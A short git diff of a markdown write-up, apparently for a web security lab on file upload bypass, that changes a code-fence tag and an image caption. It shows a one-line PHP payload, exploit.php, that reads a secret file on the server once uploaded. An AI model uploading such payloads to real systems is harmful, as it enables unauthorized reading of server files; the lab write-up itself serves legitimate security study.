@@ -27,13 +27,13 @@ There is a chance that by intercepting request and changing file type in txt fil
 ## Exploitation
 
 Payload `exploit.php`:
-```
+```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
 |![](Images/image-8.png)|
 |:--:| 
-| *PHP payload code upload* |
+| *Successful PHP payload upload* |
 |![](Images/image-7.png)|
 | *Path to uploaded file* |
 |![](Images/image-9.png)|
